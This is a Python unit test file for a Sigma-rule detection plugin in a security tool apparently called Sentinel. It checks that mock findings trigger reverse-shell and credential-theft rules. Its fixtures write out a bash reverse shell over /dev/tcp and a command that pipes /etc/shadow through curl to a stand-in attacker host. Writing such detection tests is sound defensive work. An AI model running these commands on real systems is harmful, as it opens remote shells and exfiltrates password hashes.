"""Unit tests for Sentinel Detection-as-Code Sigma Engine."""
from __future__ import annotations
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sentinel.core.models import Finding
from sentinel.core.plugins.sigma_plugin import SigmaPlugin


def test_sigma_plugin_instantiation():
    sp = SigmaPlugin()
    assert sp.name == "sigma_rules"
    assert sp.stage == "audit"


def test_sigma_reverse_shell_match():
    sp = SigmaPlugin()

    class MockContext:
        all_findings = [
            Finding(
                tool="process_anomaly",
                finding_type="vulnerability",
                value="Suspicious process spawn",
                target="localhost",
                severity="critical",
                detail="Process spawned /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                metadata={"cmdline": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
            ).to_dict()
        ]

    findings = list(sp.run("localhost", MockContext()))
    assert len(findings) >= 1
    match_f = next((f for f in findings if "SIGMA-001" in f.value), None)
    assert match_f is not None
    assert match_f.severity == "critical"
    assert match_f.metadata["mitre_technique"] == "T1059.004"
    assert "Suspicious Interactive Reverse Shell Spawn" in match_f.metadata["title"]


def test_sigma_shadow_file_match():
    sp = SigmaPlugin()

    class MockContext:
        all_findings = [
            Finding(
                tool="audit",
                finding_type="vulnerability",
                value="Command executed",
                target="localhost",
                severity="high",
                detail="Attacker ran cat /etc/shadow | curl -d @- attacker.com",
            ).to_dict()
        ]

    findings = list(sp.run("localhost", MockContext()))
    match_f = next((f for f in findings if "SIGMA-003" in f.value), None)
    assert match_f is not None
    assert match_f.metadata["mitre_technique"] == "T1003.008"


if __name__ == "__main__":
    test_sigma_plugin_instantiation()
    print("PASS test_sigma_plugin_instantiation")
    test_sigma_reverse_shell_match()
    print("PASS test_sigma_reverse_shell_match")
    test_sigma_shadow_file_match()
    print("PASS test_sigma_shadow_file_match")
    print("ALL SIGMA TESTS PASSED")
